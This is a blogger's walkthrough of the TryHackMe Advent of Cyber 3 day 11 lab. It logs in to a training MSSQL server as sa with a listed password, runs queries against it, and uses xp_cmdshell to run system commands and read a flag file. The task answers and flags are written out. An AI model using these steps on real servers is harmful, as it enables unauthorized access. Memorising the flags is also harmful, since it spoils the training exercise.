---
title: Advent Of Cyber 3 - Day 11
date: "2021-12-11"
description: MSSQL and relational databases
tldr: Networking
tags: [mssql,tryhackme,adventofcyber3,networking]

---

Start up the attached machine, connect OpenVPN to the tryhackme network and fire up nmap on the target(s).

target IP: `10.10.27.95`
```shell 
$ sudo nmap -sS -Pn -sV -p- 10.10.27.95 -vvv

Completed NSE at 16:06, 0.00s elapsed
Nmap scan report for 10.10.27.95
Host is up, received user-set (0.044s latency).
Scanned at 2021-12-12 16:04:00 CET for 125s
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
22/tcp   open  ssh           syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

port open related to MS SQL: `1433`

try to communicate with the port by using `sqsh`: 
```shell 
$ sqsh -S 10.10.27.95 -U sa -P t7uLKzddQzVjVFJp
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1> 
```

seems like it still works, so we get a prompt and can continue exploring. 

it's also possible to run queries: 
```shell 
1> select * from reindeer.dbo.names;
2> go
 id          first                                    last                                     nickname                                
 ----------- ---------------------------------------- ---------------------------------------- ----------------------------------------
           1 Dasher                                   Dasher                                   Dasher                                  
           2 Dancer                                   Dancer                                   Dancer                                  
           3 Prancer                                  Prancer                                  Prancer                                 
           4 Vixen                                    Vixen                                    Vixen                                   
           5 Comet                                    Comet                                    Comet                                   
           6 Cupid                                    Cupid                                    Cupid                                   
           7 Donner                                   Donder                                   Dunder                                  
           8 Blitzen                                  Blixem                                   Blitzen                                 
           9 Rudolph                                  Reindeer                                 Red Nosed       
```

First name of reindeer with ID: `9`: `Rudolph`

on the 7th of december they're going to:  `Prague`
```shell

1> select * from reindeer.dbo.schedule;
2> go
 id                   date                destination                                                                      notes                                   
 -------------------- ------------------- -------------------------------------------------------------------------------- ----------------------------------------
                 2000 Dec  5 2021 12:00AM Tokyo                                                                            NULL                                    
                 2001 Dec  3 2021 12:00AM London                                                                           NULL                                    
                 2002 Dec  1 2021 12:00AM New York                                                                         NULL                                    
                 2003 Dec  2 2021 12:00AM Paris                                                                            NULL                                    
                 2004 Dec  4 2021 12:00AM California                                                                       NULL                                    
                 2005 Dec  7 2021 12:00AM Prague                                                                           NULL                                    
                 2006 Dec 11 2021 12:00AM Bangkok                                                                          NULL                                    
                 2007 Dec 10 2021 12:00AM Seoul                                                                            NULL                                    

```

Amount of powerbanks left: `25000`

```shell
1> select * from reindeer.dbo.presents;
2> go
 id          name                                                                             quantity   
 ----------- -------------------------------------------------------------------------------- -----------
         100 Blanket                                                                                  500
         101 Laptop                                                                                  1000
         102 Cooler                                                                                   250
         103 BT Speaker                                                                              1000
         104 THM Subscription                                                                      100000
         105 Alarm Clock                                                                              500
         106 Cookies                                                                                10000
         107 THM T-Shirt                                                                           100000
         108 Power Bank                                                                             25000
         109 USB Hub                                                                                15000

```

run commands with `xp_cmdshell (COMMAND)`

```shell 
1> xp_cmdshell 'whoami';
2> go

output: 
nt service\mssqlserver
```

Enumerate the `users` folder to see if there's something interesting there.

```shell 
1> xp_cmdshell 'dir c:\users\grinch\Documents'
2> go

output:
11/10/2021  02:28 AM                21 flag.txt                             
```

write out the contents of the flag.txt: 

```shell 
1> xp_cmdshell 'type c:\users\grinch\Documents\flag.txt'
2> go

output                                                                     
THM{YjtKeUy2qT3v5dDH}
```

flag hidden in the grinch's home dir: `THM{YjtKeUy2qT3v5dDH}`